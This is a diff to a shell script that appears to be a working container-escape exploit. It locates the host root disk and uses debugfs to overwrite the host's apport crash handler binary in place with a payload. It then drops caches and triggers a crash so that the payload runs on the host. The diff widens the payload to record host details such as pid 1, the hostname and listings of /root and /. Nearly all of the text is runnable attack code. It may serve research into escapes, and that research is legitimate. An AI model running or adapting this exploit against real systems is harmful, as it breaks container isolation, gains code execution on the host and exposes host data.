@@ -26,16 +26,25 @@ echo "[+] FOUND-ROOT-DISK=$D"
 # 2) identity-reporting payload
 cat > /tmp/apx2 <<'PEOF'
 #!/bin/sh
-{ echo "HANDLER-EXEC $(date -u +%FT%TZ)"; echo "argv: $@";
-  echo "uid=$(id -u) gid=$(id -g)";
-  echo "pidns: $(readlink /proc/self/ns/pid)"; echo "mntns: $(readlink /proc/self/ns/mnt)";
-  echo "cgroup: $(cat /proc/self/cgroup 2>/dev/null)";
-  echo "ppid: $PPID comm: $(cat /proc/$PPID/comm 2>/dev/null)";
+{
+echo "HANDLER-EXEC $(date -u +%FT%TZ)"
+echo "argv: $@"
+echo "uid=$(id -u) gid=$(id -g)"
+echo "pidns: $(readlink /proc/self/ns/pid)"; echo "mntns: $(readlink /proc/self/ns/mnt)"
+echo "cgroup: $(cat /proc/self/cgroup 2>/dev/null)"
+echo "ppid: $PPID comm: $(cat /proc/$PPID/comm 2>/dev/null)"
+echo "host-pid1: $(cat /proc/1/comm 2>/dev/null)"
+echo "host-pid1-cgroup: $(cat /proc/1/cgroup 2>/dev/null)"
+echo "host-hostname: $(hostname 2>/dev/null)"
+echo "host-proc-count: $(ls /proc 2>/dev/null | grep -c '^[0-9]')"
+echo "host-root-ls: $(ls / 2>/dev/null | tr '\n' ' ' | cut -c1-160)"
+echo "host-rootdir-ls: $(ls /root 2>/dev/null | tr '\n' ' ' | cut -c1-120)"
+echo "host-uptime: $(cat /proc/uptime 2>/dev/null | cut -d' ' -f1)s"
 } > /HOST-PWNED-CORE 2>/dev/null; exit 0
 PEOF
 SZ=$(wc -c < /tmp/apx2)
 echo "[+] payload written: $SZ bytes"
-if [ "$SZ" -lt 300 ] || [ "$SZ" -gt 380 ]; then echo "[!] payload size unexpected, aborting"; exit 1; fi
+if [ "$SZ" -lt 500 ] || [ "$SZ" -gt 900 ]; then echo "[!] payload size unexpected, aborting"; exit 1; fi
 
 # 3) overwrite the host crash handler's first block in place
 B=$(sudo debugfs -R "blocks /usr/share/apport/apport" $D 2>/dev/null | grep -oE "[0-9]+" | head -1)
@@ -50,6 +59,8 @@ sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches' && echo "[+] CACHES-DROPPED"
 
 # 5) container identity, for contrast with the marker
 echo "[+] container pidns: $(readlink /proc/self/ns/pid)  cgroup: $(cat /proc/self/cgroup)"
+echo "[+] container pid1: $(cat /proc/1/comm 2>/dev/null)  hostname: $(hostname 2>/dev/null)"
+echo "[+] container rootdir-ls: $(ls /root 2>/dev/null | tr '\n' ' ' | cut -c1-120)"
 
 # 6) remove any stale marker, then TRIGGER
 sudo debugfs -w -R "rm /HOST-PWNED-CORE" $D >/dev/null 2>&1
